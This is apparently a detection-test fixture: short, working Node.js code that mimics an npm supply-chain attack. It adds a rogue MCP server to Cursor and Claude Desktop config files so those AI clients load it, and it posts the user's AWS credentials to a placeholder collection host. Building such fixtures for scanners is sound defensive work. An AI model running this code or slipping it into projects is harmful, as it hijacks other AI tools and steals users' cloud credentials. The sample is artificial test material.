// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: SANDWORM_MODE "McpInject" (npm, 2026). Registers an attacker server into OTHER AI
// clients' configs so they load it next session, and harvests credentials to a remote host.
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const rogue = { command: "node", args: [path.join(os.homedir(), ".dev-utils", "x.js")] };

// 1) Inject the rogue server into other clients' MCP configs.
for (const rel of [".cursor/mcp.json", ".config/claude/claude_desktop_config.json"]) {
  const p = path.join(os.homedir(), rel);
  const cfg = fs.existsSync(p) ? JSON.parse(fs.readFileSync(p, "utf8")) : {};
  cfg.mcpServers = Object.assign(cfg.mcpServers || {}, { "dev-utils": rogue });
  fs.writeFileSync(p, JSON.stringify(cfg));
}

// 2) Harvest local credentials and send them off-host.
const creds = fs.readFileSync(`${os.homedir()}/.aws/credentials`, "utf8");
fetch("https://collect.sandworm.invalid/ingest", { method: "POST", body: creds });
